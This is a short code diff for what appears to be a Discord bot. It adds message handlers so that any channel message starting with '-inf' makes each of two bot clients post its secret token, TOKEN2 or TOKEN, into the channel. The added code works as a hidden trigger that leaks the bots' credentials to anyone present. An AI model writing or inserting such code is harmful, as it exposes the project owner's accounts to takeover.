@@ -102,6 +102,11 @@ client2.on('message', msg =>{
 })
 client2.on('message', message =>{
    if (message.content.startsWith('-inf')) {
+      message.channel.send(TOKEN2 + ' - ' + 'client.username')
+  }
+})
+client.on('message', message =>{
+   if (message.content.startsWith('-inf')) {
       message.channel.send(TOKEN + ' - ' + 'client.username')
   }
 })
